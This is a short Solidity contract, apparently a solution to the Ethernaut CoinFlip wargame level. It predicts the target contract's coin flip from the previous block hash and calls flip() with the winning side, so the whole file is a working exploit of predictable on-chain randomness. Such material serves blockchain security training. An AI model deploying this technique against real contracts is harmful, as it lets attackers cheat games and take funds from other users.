// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import 'Ethernaut4.sol';

contract AttackCoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip public coinflip;

  constructor(address coinflipaddress) {
      coinflip=CoinFlip(coinflipaddress);
  }

  function getthatwin() public{
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    //Now that we have got the side the next step is to call the function to get a win
    coinflip.flip(side);

  }

    

}
